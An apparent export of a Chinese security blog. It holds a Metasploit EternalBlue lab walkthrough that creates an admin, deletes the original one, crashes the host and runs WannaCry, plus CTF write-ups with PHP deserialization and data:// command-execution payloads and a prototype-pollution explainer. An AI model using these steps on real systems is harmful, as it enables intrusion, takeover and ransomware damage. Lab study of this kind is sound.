<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p>搜索ms17-010,永恒之蓝漏洞的exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_1.jpg" alt=""><br>第三个就是要找的exp，使用这个exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
<p>查看一下需要配置那些参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_2.jpg" alt=""><br>发现RHOSTS还没有配置，配置RHOSTS,也就是靶机的ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.1.106</span><br></pre></td></tr></table></figure>
<p>配置payload,先查询一下有哪些可用的payload<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_3.jpg" alt=""><br>这里需要找一个可以反向连接的payload,第15条就可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<p>查看一下需要配置那些参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_4.jpg" alt=""><br>需要配置LHOST,也就是攻击机的ip地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br></pre></td></tr></table></figure>
<p>执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit 或者 run</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_5.jpg" alt=""><br>攻击成功，接下来就可对靶机进行操作了，在开始前已经在靶机的桌面建了一个win7.txt的文件，尝试去把它下载到本地<br>将目录切换到桌面<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_6.jpg" alt=""><br>将win7.txt文件下载到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">download win7.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_7.jpg" alt=""><br>还可以进行提权，先进入windows的命令行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
<p>查看所有的用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
<p>创建一个新用户hacker,密码为123456</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user hacker 123456 /add</span><br></pre></td></tr></table></figure>
<p>将该普通用户提权为管理员用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net localgroup Administrators hacker /add</span><br></pre></td></tr></table></figure>
<p>删除原来的管理员用户w1ndy</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user w1ndy /del</span><br></pre></td></tr></table></figure>
<p>kill掉wininit.exe进程，直接打蓝屏，重启一下就好了<br>``bash<br>taskkill /f /im wininit.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">还有很多命令可以执行，可以使用&quot;help&quot;这个命令来查看</span><br><span class="line">比如，截屏命令</span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">screenshot</span><br></pre></td></tr></table></figure>
<h3 id="渗透成功后上传WannaCry勒索软件"><a href="#渗透成功后上传WannaCry勒索软件" class="headerlink" title="渗透成功后上传WannaCry勒索软件"></a>渗透成功后上传WannaCry勒索软件</h3><p>永恒之蓝病毒样本：<a href="https://bbs.pediy.com/thread-217586.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-217586.htm</a><br>将wcry2文件夹上传到靶机的C盘下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload wcry2 c:/</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_8.jpg" alt=""><br>用shell命令切换到win7的终端运行该病毒</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wcry.exe</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_9.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_10.jpg" alt=""></p>
<p>Meterpreter常用命令<br><a href="https://www.cnblogs.com/wjw-zm/p/11688992.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjw-zm/p/11688992.html</a><br><a href="https://www.cnblogs.com/maohai-kdg/p/12915718.html" target="_blank" rel="noopener">https://www.cnblogs.com/maohai-kdg/p/12915718.html</a></p>
<h3 id="利用rdesktop远程连接靶机桌面"><a href="#利用rdesktop远程连接靶机桌面" class="headerlink" title="利用rdesktop远程连接靶机桌面"></a>利用rdesktop远程连接靶机桌面</h3><p>连接之前需要一个靶机的账户，开启靶机的3389端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
<p>该命令就可开启靶机的3389端口<br>将靶机的3389端口转发到本地的6666端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_11.jpg" alt=""><br>接下来就可以用rdesktop连接靶机了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1:6666</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_12.jpg" alt=""><br>连接成功后就会弹出登陆界面<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_13.jpg" alt=""><br>登陆即可</p>
<p>针对win xp还可以利用ms08-067漏洞</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2020-7066</title>
    <url>/2020/07/07/CVE-2020-7066/</url>
    <content><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>get_headers()是PHP系统级函数，他返回一个包含有服务器响应一个HTTP请求所发送的标头的数组。如果失败则返回 FALSE 并发出一条 E_WARNING 级别的错误信息(可用来判断远程文件是否存在)。<br>array get_headers(string $url,int $format=0)<br>url为目标的URL,format是可选参数，默认为0，如果设置为1，则get_headers()会解析成相应的信息并设定数组的键名</p>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$url</span>=<span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">print_r(get_headers(<span class="variable">$url</span>));</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">print_r(get_headers(<span class="variable">$url</span>,1));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CVE-2020-7066/CVE20207066_0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CVE-2020-7066/CVE20207066_1.jpg" alt=""><br>get_headers()函数会截断URL中空字符后的内容<br>存在版本：7.2.x(低于7.2.29)、7.3.x(低于7.3.16)、7.4.x(低于7.4.4)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'url'</span>] =<span class="string">"https://www.baidu.com\0.haha.com"</span>; </span><br><span class="line"><span class="variable">$host</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">'url'</span>], PHP_URL_HOST);    // 解析URL并返回其组成部分</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$host</span>, -9) !==<span class="string">'.haha.com'</span>)&#123; </span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$headers</span> = get_headers(<span class="variable">$_GET</span>[<span class="string">'url'</span>]); </span><br><span class="line">var_dump (<span class="variable">$headers</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CVE-2020-7066/CVE-2020-7066_2.jpg" alt=""><br>可以看到<a href="https://www.baidu.com\0.haha.com" target="_blank" rel="noopener">https://www.baidu.com\0.haha.com</a> 最终被解析成了 <a href="https://www.baidu.com，" target="_blank" rel="noopener">https://www.baidu.com，</a> 从\0处截断了</p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p><a href=https://zxfireworks.xyz/2020/03/14/BUUCTF-Web>[GKCTF2020]cve版签到</a></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>ISCC-2020</title>
    <url>/2020/05/01/ISCC-2020/</url>
    <content><![CDATA[<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/web1.jpg" alt=""><br>测试了下SQL注入，没啥反应，源码也啥都没有<br>dirsearch直接扫，在readme.txt中发现flag</p>
<a id="more"></a>
<h4 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h4><p>文件下载下来后，是php代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">function</span> __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">"./&#123;<span class="variable">$this</span>-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents(<span class="variable">$filename</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">return</span> base64_encode(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">'data'</span>];</span><br><span class="line">        <span class="variable">$good</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$good</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="string">'./index.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'test'</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">'test'</span>];</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">"&lt;p&gt;谢谢参与!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>看见unserialize()就知道考察反序列化<br>在反序列化时会触发__toString(),就可利用该函数读出flag.php文件里的内容<br>exp:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">function</span> __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">"./&#123;<span class="variable">$this</span>-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents(<span class="variable">$filename</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">return</span> base64_encode(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$good</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$good</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>payload:?data=O:4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}<br>界面打印出一段base64编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgJGE9J2ZsYWd7dV9yX3JlYWxseV9hX3BocF9leHBlcnR9Jzs/Pg0K</span><br></pre></td></tr></table></figure>
<p>解密后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">'flag&#123;u_r_really_a_php_expert&#125;'</span>;?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'hello'</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$file</span>, <span class="string">"file://"</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>=str_replace(<span class="string">"file://"</span>, <span class="string">""</span>, <span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">include(<span class="variable">$file</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>文件包含漏洞，过滤了file协议，换个协议就行了<br>payload:?file=data://text/plain,<?php system("ls")?><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/file.jpg" alt=""><br>发现有flag.php<br>payload:?file=data://text/plain,<?php system("cat flag.php")?><br>在注释中发现了flag{web_include_file}</p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ISCC签到"><a href="#ISCC签到" class="headerlink" title="ISCC签到"></a>ISCC签到</h4><p>吐槽一下：签到题还整个坑，出题人也是够了<br>一张图片，名字是high.png,第一反应修改图片高度，果然在图片底部隐藏有信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125;</span><br></pre></td></tr></table></figure>
<p>提交发现不对，去掉ISCC和括号也不对，变成小写iscc也不对，前缀改成flag还是不对，群里的大佬纷纷讨论，是不是题目有问题，客服来了句这道题有坑，直接了<br>一套子图片隐写工具下来没啥发现，就回到了隐藏信息上<br>想了好久，试了好几种加密方式，最后突发奇想可能是维吉尼亚密码，密钥也试了好几种，差点就觉得不是维吉尼亚密码了<br>突然想到high可能是密码，然后就解出来了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BKWV&#123;W3lcome_to_Mi5C_Wryyy&#125;</span><br></pre></td></tr></table></figure>
<p>把前缀换成ISCC就可了</p>
<h3 id="寻找小明-1"><a href="#寻找小明-1" class="headerlink" title="寻找小明-1"></a>寻找小明-1</h3><p>stegosolve打开，发现二维码，扫码后的内容是个网址，打开后给了一组数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[257,1,258,2,259,3,260,4,261,5,262,7,263,8,259,277,438,300,455,319,25,300,456,400,66,366,78,300,421,259,452,23]</span><br></pre></td></tr></table></figure>
<p>这次的ISCC的Misc脑洞真的是大，之后大佬提示说是每两个一组作为图片像素点，然后就会发现每个点的R颜色通道值的ASCII码就是flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line">img=cv2.imread(<span class="string">'zx.png'</span>)</span><br><span class="line">x=[257,258,259,260,261,262,263,259,438,455,25,456,66,78,421,452]</span><br><span class="line">y=[1,2,3,4,5,7,8,277,300,319,300,400,366,300,259,23]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):</span><br><span class="line">    px = img[y[i], x[i]]</span><br><span class="line">    <span class="built_in">print</span>(chr(px[2]),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
<h3 id="ISCC成绩查询-1"><a href="#ISCC成绩查询-1" class="headerlink" title="ISCC成绩查询-1"></a>ISCC成绩查询-1</h3><p>stegsolve打开，会发现一张图片<br>很明显是考察图论，在这里就是根据已知的节点编号经过且仅经过一次每一条边得到的边的顺序，再栅栏密码解密即可<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/socre.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">连接后为：TRLNCHHAFCIEEIEEPR</span><br><span class="line">栅栏密码解密后为：THERAILFENCECIPHER</span><br><span class="line">FLAG：flag&#123;THERAILFENCECIPHER&#125;</span><br></pre></td></tr></table></figure>
<h4 id="是我DIO哒-擂台赛"><a href="#是我DIO哒-擂台赛" class="headerlink" title="是我DIO哒(擂台赛)"></a>是我DIO哒(擂台赛)</h4><p>winhex打开啥也没发现<br>用stegsolve打开发现了一段信息<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/dio.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Useful_Massage_2(fa09fTjBfRCUyMW9fZGFhYWElMjFfXyU3RA==)</span><br></pre></td></tr></table></figure>
<p>base64解码后是乱码，因为这是第二部分，还缺一部分<br>在kali中用binwalk and foremost 分离出一张二维码，扫码后是第一部分</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Useful_Massage_1(SVNDQyU3QmZsQGdfaXN)</span><br></pre></td></tr></table></figure>
<p>拼接后base64解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SVNDQyU3QmZsQGdfaXNfa09fTjBfRCUyMW9fZGFhYWElMjFfXyU3RA==</span><br><span class="line">解码后为：ISCC%7Bfl@g_is_kO_N0_D%21o_daaaa%21__%7D</span><br></pre></td></tr></table></figure>
<p>明显里面混有URL编码，解码后为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ISCC&#123;fl@g_is_kO_N0_D!o_daaaa!__&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Linux系统中安装LANMP</title>
    <url>/2020/01/20/Linux%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%AE%89%E8%A3%85LANMP/</url>
    <content><![CDATA[<p>LANMP是Linux下Apache、Nginx、MySQL和PHP的应用环境，本文章使用的是WDLinux的一款集成的安装包</p>
<a id="more"></a>
<h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://dl.wdlinux.cn/files/lanmp_v3.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/lanmp_install.PNG" alt=""></p>
<h3 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf lanmp_v3.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/lanmp_install.PNG" alt=""></p>
<h3 id="安装LANMP"><a href="#安装LANMP" class="headerlink" title="安装LANMP"></a>安装LANMP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh lanmp.sh</span><br></pre></td></tr></table></figure>
<p>在Kali和Ubantu系统中，输入该命令会报错<br><img src="http://q63cs67co.bkt.clouddn.com/error.PNG" alt=""><br>这是因为系统的dash兼容性不好，而编译常用的就是bash,可通过以下命令修改系统的编辑器(Shell)操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg-reconfigure dash</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/shell.PNG" alt=""><br>然后选择&lt;否&gt;<br><img src="http://q63cs67co.bkt.clouddn.com/shell_sure.PNG" alt=""><br>这时会有五个选项<br>选项一：安装Apache、PHP、MySQL、Zend、PureFTPd和phpMyAdmin服务<br>选项二：安装Nginx、PHP、MySQL、Zend、PureFTPd和phpMyAdmin服务<br>选项三：安装Nginx、Apache、PHP、MySQL、Zend、PureFTPd和phpMtAdmin服务<br>选项四：安装所有服务<br>选项五：现在不安装<br><img src="http://q63cs67co.bkt.clouddn.com/choose.PNG" alt=""><br>然后就报错了，网上找了半天也没找到，先这样吧，等问问大佬先<br>安装成功后在浏览器访问IP和8080端口，输入默认账号admin和密码wdlinux.cn</p>
]]></content>
      <categories>
        <category>Web安全攻防-渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript原型链污染</title>
    <url>/2020/06/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1At411t7Lu?from=search&seid=11463946534016996399" target="_blank" rel="noopener">JS中的原型和原型链</a></p>
<h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h3><p>在JavaScript中，每个函数都有一个默认原型属性，也就是prototype，在使用该构造函数实例化对象时就会继承该原型中的属性和方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> Persion(name,age) &#123;</span><br><span class="line">        this.name=<span class="string">"w1ndy"</span>;</span><br><span class="line">        this.age=20;</span><br><span class="line">    &#125;</span><br><span class="line">    var p1=new Persion();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js0.jpg" alt=""><br>这里对象p1继承了Persion的原型的属性myfunc<br>在javascript中的继承不同于面向对象编程中的继承，在javascript中是通过原型链__proto__来实现继承的</p>
<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js1.jpg" alt=""><br>对于Persion来说要访问它的原型，用Persion.prototype就可。但是用Persion实例化出来的对象p1无法通过该方法来访问原型，需要通过p1.__proto__来访问Persion的原型,从图中结果可以得出结论</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Persion.prototype===p1.__proto__</span><br></pre></td></tr></table></figure>
<p>在对象p1中本身是没有myfunc的，那它是怎么找到该属性的呢，其实就是通过__proto__原型链来找的，也就是说先在自己身上找，如果找不到就向上访问它的原型链，在其原型链上继续找，如果还是找不到，继续向上，直到找到或者找到Object还是没找到就结束<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js2.jpg" alt=""><br>我在Object中添加了一个属性objfunc,当使用p1.objfunc时，他会先在自身找，发现找不到，然后通过p1.__proto__来在Persion上找，发现还是没找到，继续在Persion的原型链上找，也就是通过p1.__proto__.__proto__在Object上找，然后就找到了objfunc<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js3.jpg" alt=""><br>每个原型都有一个constructor属性，它是指向关联的构造函数<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js4.jpg" alt=""><br>构造函数、原型、实例对象之间关系如下图所示<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js5.jpg" alt=""></p>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js6.jpg" alt=""><br>在上述例子中，a有一个len属性，b是空的，此时b访问len属性是访问不到的;执行a.__proto__.len=2之后，b就能访问到len属性了;<br>原因如下：<br>a.__proto__.len=2修改的是a的原型的属性，即Object的属性，而b的原型也是Object,从而b也能访问到len属性；如果能够控制并修改一个对象的原型，这将会影响所有和这个对象来自同一个类或祖父类的对象，这种攻击方式就是原型链污染。<br>原型链污染的发现场景：</p>
<h4 id="对象merge"><a href="#对象merge" class="headerlink" title="对象merge"></a>对象merge</h4><p>需要控制一个键值对<br>将<strong>proto</strong>解析为键名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> merge(target,<span class="built_in">source</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">let</span> key <span class="keyword">in</span> <span class="built_in">source</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> target &amp;&amp; key <span class="keyword">in</span> <span class="built_in">source</span>)&#123;</span><br><span class="line">            merge(target[key],<span class="built_in">source</span>[key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key]=<span class="built_in">source</span>[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js8.jpg" alt=""><br>c.n2返回undefined，说明没有污染成功，这是因为这里的__proto__没有被解析为一个键名，而是被当作b的原型，所以需要使用JSON.parse()将__proto__解析为键名才能污染原型链。<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js7.jpg" alt=""><br>c.n2=2,污染成功了</p>
<h4 id="对象clone"><a href="#对象clone" class="headerlink" title="对象clone"></a>对象clone</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>(obj)&#123;</span><br><span class="line">    <span class="built_in">return</span> merge(&#123;&#125;,obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theFunction(obj,path,value)</span><br></pre></td></tr></table></figure>
<p>如果path参数可控，就可以通过修改__proto__.value的值从而改变Object的属性，达到污染原型链的目的。</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>NewBugku-Web</title>
    <url>/2019/12/14/NewBugku-Web/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>NCTF 2019 Web复现</title>
    <url>/2019/11/26/NCTF-2019/</url>
    <content><![CDATA[<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>代码分为三块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="variable">$string_1</span> = <span class="variable">$_GET</span>[<span class="string">'str1'</span>];</span><br><span class="line"><span class="variable">$string_2</span> = <span class="variable">$_GET</span>[<span class="string">'str2'</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">'q_w_q'</span>];</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>第一块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>preg_match函数用于执行正则表达式的匹配：<br><a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-preg_match.html</a><br>preg_match(‘/^23333$/‘, $_GET[‘num’])<br>其中有两个特别的字符’^’，’$’<br>“^abc”:匹配以”abc”开头的字符串；<br>“abc$”:匹配以”abc”结尾的字符串；<br>“^abc$”:匹配以”abc”开头和以”abc”结尾的字符串，显然只有字符串”abc”符合要求</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]</span><br></pre></td></tr></table></figure>
